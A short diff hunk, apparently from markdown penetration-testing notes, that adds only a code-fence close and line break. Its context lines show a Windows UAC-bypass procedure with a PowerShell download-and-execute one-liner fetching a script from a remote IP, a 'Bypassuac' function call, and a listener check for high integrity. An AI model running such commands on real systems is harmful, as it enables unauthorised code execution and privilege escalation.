@@ -1272,6 +1272,8 @@ accesschk.exe "currentuser" C:\Windows -wus
 2. Execute 'iex(new-object net.webclient).downloadstring('http://172.21.23.10/CodeBelow.ps1')
 3. Might need to run twice and then execute the function 'Bypassuac'
 4. Check Listener and verify 'whoami /groups'. Your looking for 'High mandatory level'
+```
+<br>
 
 ```powershell
 function tryme { 
